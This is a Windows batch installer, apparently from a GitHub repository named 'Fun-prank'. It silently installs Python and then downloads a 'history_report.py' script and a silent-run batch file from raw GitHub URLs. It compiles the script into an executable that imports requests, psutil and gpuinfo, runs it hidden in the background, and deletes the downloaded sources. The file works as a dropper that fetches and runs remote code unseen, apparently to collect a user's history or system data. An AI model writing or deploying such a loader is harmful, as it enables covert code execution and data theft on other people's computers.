@echo off
:: Define the install directory
set INSTALL_DIR=%LOCALAPPDATA%\History
set LOG_FILE=%INSTALL_DIR%\install_log.txt

:: Create the "History" folder if it doesn't exist
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
)

:: Start logging
echo Installation Log for History Report > "%LOG_FILE%"
echo ================================== >> "%LOG_FILE%"

:: Step 1: Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python silently... >> "%LOG_FILE%"
    powershell -Command "Start-Process 'https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait"
    echo Python installation completed. >> "%LOG_FILE%"
)

:: Step 2: Install pip if not installed
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip is not installed. Installing pip silently... >> "%LOG_FILE%"
    python -m ensurepip --upgrade
    echo pip installation completed. >> "%LOG_FILE%"
)

:: Step 3: Download the requirements.txt from GitHub
echo Downloading requirements.txt... >> "%LOG_FILE%"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt -OutFile %INSTALL_DIR%\requirements.txt"
echo Download complete. >> "%LOG_FILE%"

:: Step 4: Install necessary Python libraries from requirements.txt
echo Installing necessary libraries from requirements.txt... >> "%LOG_FILE%"
python -m pip install -r "%INSTALL_DIR%\requirements.txt" >> "%LOG_FILE%" 2>&1
echo Libraries installation completed. >> "%LOG_FILE%"

:: Step 5: Check if requests library is installed
python -c "import requests" >nul 2>nul
if %errorlevel% neq 0 (
    echo Requests installation failed. Exiting... >> "%LOG_FILE%"
    pause
    exit /b
)

:: Step 6: Download the Python script from GitHub
echo Downloading Python script... >> "%LOG_FILE%"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py -OutFile %INSTALL_DIR%\history_report.py"
echo Python script download complete. >> "%LOG_FILE%"

:: Step 7: Download the .bat file for running silently
echo Downloading .bat file for running silently... >> "%LOG_FILE%"
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/install_run_silent.bat -OutFile %INSTALL_DIR%\install_run_silent.bat"
echo Silent .bat download complete. >> "%LOG_FILE%"

:: Step 8: Check if the Python script exists
if not exist "%INSTALL_DIR%\history_report.py" (
    echo Script file not found. Please make sure history_report.py is in the "History" folder. >> "%LOG_FILE%"
    pause
    exit /b
)

:: Step 9: Convert the Python script to an executable using PyInstaller with explicit imports
echo Converting script to executable... >> "%LOG_FILE%"
pyinstaller --onefile --hidden-import=requests --hidden-import=psutil --hidden-import=gpuinfo --clean "%INSTALL_DIR%\history_report.py" >> "%LOG_FILE%" 2>&1
echo Conversion completed. >> "%LOG_FILE%"

:: Step 10: Check if the executable was created
if not exist "dist\history_report.exe" (
    echo Failed to create executable. Exiting... >> "%LOG_FILE%"
    pause
    exit /b
)

:: Step 11: Move the executable to the install directory
echo Moving executable to install directory... >> "%LOG_FILE%"
move /Y dist\history_report.exe "%INSTALL_DIR%\history_report.exe" >> "%LOG_FILE%"
echo Executable moved. >> "%LOG_FILE%"

:: Step 12: Run the executable silently
echo Running the executable silently... >> "%LOG_FILE%"
start /B "%INSTALL_DIR%\history_report.exe" >> "%LOG_FILE%" 2>&1

:: Step 13: Clean up PyInstaller files (optional)
echo Cleaning up PyInstaller files... >> "%LOG_FILE%"
rd /s /q "build" >> "%LOG_FILE%"
del /q "history_report.spec" >> "%LOG_FILE%"

:: Step 14: Clean up the downloaded files from the install directory
del "%INSTALL_DIR%\install_run_silent.bat" >> "%LOG_FILE%"
del "%INSTALL_DIR%\history_report.py" >> "%LOG_FILE%"
del "%INSTALL_DIR%\requirements.txt" >> "%LOG_FILE%"

echo Installation completed. >> "%LOG_FILE%"
pause
